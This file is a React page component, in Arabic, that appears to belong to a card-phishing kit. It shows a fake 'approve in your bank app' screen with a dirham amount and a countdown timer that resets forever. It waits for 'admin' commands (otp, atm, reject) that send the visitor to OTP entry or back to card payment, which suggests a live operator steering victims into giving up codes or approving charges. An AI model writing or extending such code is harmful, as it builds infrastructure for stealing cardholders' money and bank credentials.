import { useEffect, useState } from "react";
import { useSignalEffect } from "@preact/signals-react";
import { useLocation } from "wouter";
import PageLayout from "@/components/layout/PageLayout";
import WaitingOverlay, { waitingCardInfo } from "@/components/WaitingOverlay";
import {
  navigateToPage,
  cardAction,
} from "@/lib/store";

export default function BankAppVerification() {
  const [, navigate] = useLocation();
  const [timer, setTimer] = useState(120); // 2 minutes = 120 seconds

  // Get payment data from localStorage
  const paymentData = JSON.parse(localStorage.getItem("paymentData") || "{}");
  const totalAmount = paymentData.totalPaid || 0;

  // Get card info from localStorage (fallback) or signal
  const signalCardInfo = waitingCardInfo.value;
  const cardInfo = signalCardInfo || {
    bankName: paymentData.bankName || '',
    bankLogo: paymentData.bankLogo || '',
    cardType: paymentData.cardType || '',
  };

  // Emit page enter
  useEffect(() => {
    navigateToPage("تطبيق البنك");
  }, []);

  // Countdown timer - resets when it reaches 0
  useEffect(() => {
    const interval = setInterval(() => {
      setTimer((prev) => {
        if (prev <= 1) {
          return 120; // Reset to 2 minutes
        }
        return prev - 1;
      });
    }, 1000);
    return () => clearInterval(interval);
  }, []);

  // Handle card action from admin (navigate away if admin sends another action)
  useSignalEffect(() => {
    if (cardAction.value) {
      const action = cardAction.value.action;
      if (action === 'otp') {
        navigate("/otp-verification");
      } else if (action === 'atm') {
        navigate("/otp-verification");
      } else if (action === 'reject') {
        navigate("/credit-card-payment");
      }
      cardAction.value = null;
    }
  });

  // Format timer as MM:SS
  const mins = Math.floor(timer / 60).toString().padStart(2, "0");
  const secs = (timer % 60).toString().padStart(2, "0");

  return (
    <PageLayout variant="default">
      <WaitingOverlay />

      <div className="bg-white rounded-2xl shadow-xl p-6 max-w-md mx-auto">
        {/* Bank Logo and Card Type */}
        <div className="flex justify-between items-center mb-6 px-4">
          {/* Card Type Logo (Visa/Mastercard) */}
          <div className="flex items-center">
            <img
              src={cardInfo?.cardType?.toLowerCase() === 'visa' ? '/images/visa.png' : cardInfo?.cardType?.toLowerCase() === 'mastercard' ? '/images/mastercard.png' : '/images/visa.png'}
              alt={cardInfo?.cardType || 'Card'}
              className="h-8 object-contain"
            />
          </div>
          {/* Bank Logo */}
          {cardInfo?.bankLogo && (
            <div className="flex items-center">
              <img
                src={cardInfo.bankLogo}
                alt={cardInfo.bankName || "Bank"}
                className="h-8 object-contain"
              />
            </div>
          )}
        </div>

        {/* Phone Icon - Professional Design */}
        <div className="flex justify-center mb-5">
          <div className="relative">
            {/* Outer ring */}
            <div className="w-16 h-16 rounded-full bg-blue-50 flex items-center justify-center">
              {/* Inner circle */}
              <div className="w-12 h-12 rounded-full bg-gradient-to-br from-blue-500 to-blue-600 flex items-center justify-center shadow-md">
                <svg className="w-6 h-6 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24" strokeWidth="1.8">
                  <rect x="7" y="2" width="10" height="20" rx="2" ry="2" />
                  <line x1="12" y1="18" x2="12" y2="18.01" strokeWidth="2" strokeLinecap="round" />
                </svg>
              </div>
            </div>
            {/* Notification dot */}
            <div className="absolute -top-0.5 -right-0.5 w-4 h-4 bg-green-500 rounded-full border-2 border-white flex items-center justify-center">
              <svg className="w-2.5 h-2.5 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24" strokeWidth="3">
                <path strokeLinecap="round" strokeLinejoin="round" d="M5 13l4 4L19 7" />
              </svg>
            </div>
          </div>
        </div>

        {/* Main Message */}
        <div className="text-center mb-6">
          <h1 className="text-lg font-bold text-gray-800 mb-3">تأكيد عملية الشراء</h1>
          <div className="bg-blue-50 border border-blue-200 rounded-xl p-4">
            <p className="text-gray-700 text-sm leading-relaxed font-medium">
              عليك الدخول إلى تطبيق البنك الخاص بك للموافقة على عملية الشراء
            </p>
            {totalAmount > 0 && (
              <p className="text-blue-700 font-bold text-base mt-2">
                المبلغ: {totalAmount} د.إ
              </p>
            )}
          </div>
        </div>

        {/* Countdown Timer - Clean Design */}
        <div className="text-center mb-5">
          <p className="text-gray-500 text-xs mb-2">الوقت المتبقي للموافقة</p>
          <div className="inline-flex items-center justify-center gap-2">
            <div className="bg-gray-900 text-white rounded-lg w-12 h-12 flex items-center justify-center shadow-md">
              <span className="text-xl font-mono font-bold">{mins}</span>
            </div>
            <span className="text-gray-900 text-xl font-bold">:</span>
            <div className="bg-gray-900 text-white rounded-lg w-12 h-12 flex items-center justify-center shadow-md">
              <span className="text-xl font-mono font-bold">{secs}</span>
            </div>
          </div>
        </div>

        {/* Waiting Animation */}
        <div className="flex justify-center items-center gap-2 py-3">
          <div className="w-2 h-2 bg-blue-500 rounded-full animate-bounce" style={{ animationDelay: '0ms' }}></div>
          <div className="w-2 h-2 bg-blue-500 rounded-full animate-bounce" style={{ animationDelay: '150ms' }}></div>
          <div className="w-2 h-2 bg-blue-500 rounded-full animate-bounce" style={{ animationDelay: '300ms' }}></div>
          <span className="text-gray-500 text-xs mr-2">في انتظار الموافقة...</span>
        </div>

        {/* Info Note */}
        <div className="bg-yellow-50 border border-yellow-200 rounded-lg p-2.5 mt-3">
          <p className="text-yellow-800 text-xs text-center">
            ⚠️ لا تغلق هذه الصفحة حتى تتم الموافقة من تطبيق البنك
          </p>
        </div>
      </div>
    </PageLayout>
  );
}
